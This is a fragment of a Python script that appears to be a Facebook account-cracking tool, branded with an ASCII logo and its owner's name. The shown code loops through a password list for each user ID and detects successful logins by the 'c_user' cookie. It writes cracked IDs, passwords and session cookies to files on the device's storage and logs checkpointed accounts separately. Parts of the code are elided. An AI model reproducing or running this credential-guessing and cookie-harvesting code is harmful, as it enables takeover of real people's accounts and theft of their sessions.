...
sys.stdout.write('\x1b]2; Rofiqul10\x07')
#▬▭▬▭▬▭▬▭[ LOGO ]▬▭▬▭▬▭▬▭#
def clr_logo():
    magi("clear")
    print(f"""{a}
...
|/   \__/|/     \||/       \_______/                         
{sxrline}
 {a}[{b}●{a}] {a}TOOL OWNER    {f}:{b} RAFI
 {a}[{b}●{a}] {a}FACEBOOK      {f}:{b} ROFIQUL HASAN RAFI
        ...
        for pww in passlist:
            ...
            if 'c_user' in login_coki:
                ...
                if 'Photoshop' in respns:
                    print(f"\r\r {b}[Rdx-OK] {uid} | {pww}")
                    if 'y' in pmsn_ckki:print(f"\r\r {f}COOKIES : {coki}\n")
                    open('/sdcard/Rdx-RNDM-OK-COOKIE.txt.txt','a').write(uid+'|'+pww+'|'+coki+'\n')
                    open('/sdcard/Rdx-RNDM-OK.txt','a').write(uid+'|'+pww+'\n')
                    oks.append(uid)
                    break
                else:break
                ...
                print(f"\r\r {c}[Rdx-CP] {uid} | {pww}")
                open('/sdcard/Rdx-RNDM-CP.txt','a').write(uid+'|'+pww+'\n')
                cps.append(uid)
                break
            else:continue
        loop+=1
